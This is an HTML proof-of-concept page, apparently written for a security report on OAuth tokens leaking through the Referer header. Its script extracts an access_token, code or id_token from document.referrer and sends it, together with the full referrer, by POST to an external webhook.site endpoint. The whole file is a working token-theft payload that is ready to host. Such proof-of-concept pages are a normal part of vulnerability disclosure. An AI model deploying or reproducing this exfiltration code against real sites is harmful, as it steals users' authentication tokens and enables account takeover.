<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Referrer Leak PoC</title>
</head>
<body>
  <h2>üîç Referrer Leak PoC</h2>
  <p id="referrer">Loading referrer...</p>
  <p id="token">Looking for token...</p>

  <script>
    // Safely get the referrer
    const ref = document.referrer || "No referrer detected.";
    document.getElementById("referrer").innerText = "Referrer: " + ref;

    // Try to extract token from referrer
    const match = ref.match(/(?:access_token|code|id_token)=([^&]+)/i);
    if (match && match[1]) {
      const token = match[1];
      document.getElementById("token").innerText = "üö® Leaked Token: " + token;

      // Send token to your webhook
      fetch("https://webhook.site/dfbb8dab-9ac7-4819-874f-bd3c43899a1a", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          leaked_token: token,
          full_referrer: ref,
          timestamp: new Date().toISOString()
        })
      });
    } else {
      document.getElementById("token").innerText = "‚ùå No token found in referrer.";
    }
  </script>
</body>
</html>
